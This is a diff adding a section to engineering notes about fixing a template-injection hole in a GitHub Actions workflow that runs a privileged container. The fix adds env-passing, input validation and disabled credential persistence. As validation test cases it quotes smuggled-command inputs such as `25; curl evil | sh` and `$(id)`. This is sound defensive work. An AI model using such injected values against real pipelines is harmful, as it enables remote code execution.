@@ -1508,3 +1508,35 @@ empty-array expansion is written `${a[@]+"${a[@]}"}` because under
 `set -u` the bare form is an unbound-variable error before bash 4.4 and
 the script is reachable from a macOS host whose `/bin/bash` is 3.2 —
 measured both ways, not assumed.
+
+### A third correction to the instrument, this one from a reviewer
+
+Kusari Inspector failed PR #1321 on the rate workflow and was right.
+The step interpolated `${{ inputs.deadline_seconds }}`,
+`${{ inputs.iterations }}` and `${{ github.ref }}` straight into `run:`
+shell blocks — a template-injection path in a job that **builds and runs
+a privileged container**, so an injected command would execute with that
+container's reach. Dispatch requires write access, which bounds the
+exposure, and does not make it acceptable: the repository already routes
+values through `env:` for exactly this reason at `ci.yml:804-808` and in
+the m896 canary, and this workflow simply did not follow a pattern that
+was already written down two files away.
+
+Fixed by passing them through `env:` and referencing them quoted, plus
+validation, since the values are not merely untrusted strings but a
+`timeout` argument and a loop bound: non-numeric input would fail
+obscurely inside the probe and an unbounded one would hold a runner
+indefinitely. Both bounds are reasoned rather than guessed — 500 traces
+at ~10s each already exceeds any deadline the job accepts. Checked
+against nine cases including `25; curl evil | sh`, `$(id)`, empty, zero,
+negative and leading whitespace; all rejected, the defaults accepted.
+
+Inspector also named a hardening gap in `tracepoint-inventory.yml`, the
+other workflow this branch adds: its checkout left credentials in the
+local git config. A probe needs none, so `persist-credentials: false`.
+
+Worth recording for what it says about the review loop rather than the
+defect. Three of this instrument's four defects were found by asking a
+question other than "does it look right": *can it be invoked* found two,
+and an external analyser found this one. Reading the file again found
+none of them.
